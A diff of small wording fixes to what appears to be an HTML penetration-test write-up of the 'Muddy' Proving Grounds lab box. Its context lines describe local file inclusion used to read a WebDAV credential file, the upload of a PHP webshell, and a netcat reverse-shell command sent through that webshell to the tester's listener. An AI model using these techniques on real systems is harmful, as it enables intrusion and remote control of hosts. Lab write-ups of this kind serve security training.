@@ -117,7 +117,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
     <p>One interesting thing that is revelead is the /dav directory.  We visit this page and it asks for a username and password.  I tried a few combos but nothing worked.  We will note this for later.</p>
 
-    <h2>Port 8888</h2>
+    <h2>Port 8888 - LFI</h2>
 
     <img src="Muddy/port8888.png">
     
@@ -197,7 +197,7 @@ xmlns:urn=\&quot;urn:checkout\&quot;&gt;&lt;soapenv:Header/&gt;
 
     <p>Now that we have a working LFI exploit we will use it to gain more information to gain shell access to the host.  Thinking back to the muddy.ugc/webdav directory, there are likely credentials for basic auth on the web server.  We can find these credentials in /var/www/html/webdav/passwd.dav</p>
 
-    LFI for passwd.dave file</li>
+    LFI for passwd.dav file</li>
 
     <pre>
  &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
@@ -262,7 +262,7 @@ Uploading shell.php to `/webdav/shell.php&#039;:
 Progress: [=============================&gt;] 100.0% of 35 bytes succeeded.
     </pre>
 
-    <p>Now that we have our webshell uploaded we can access it by going to http://muddy.ugc/webdav and logging in with administrant:sleepless.  Once we login we get access to the page with out webshell, shell.php.  Now we can get our reverse shell using netcat.  I setup my reverse listener on port 80 and then sent this through my browser: http://muddy.ugc/webdav/shell.php?cmd=nc -nv 192.168.49.248 80 -e /bin/bash</p>
+    <p>Now that we have our webshell uploaded we can access it by going to http://muddy.ugc/webdav and logging in with administrant:sleepless.  Once we login we get access to the page with our webshell, shell.php.  Now we can get our reverse shell using netcat.  I setup my reverse listener on port 80 and then sent this through my browser: http://muddy.ugc/webdav/shell.php?cmd=nc -nv 192.168.49.248 80 -e /bin/bash</p>
 
     <li>Receiving reverse shell and upgrading the shell for pty, clear command, and autocomplete.</li>
 
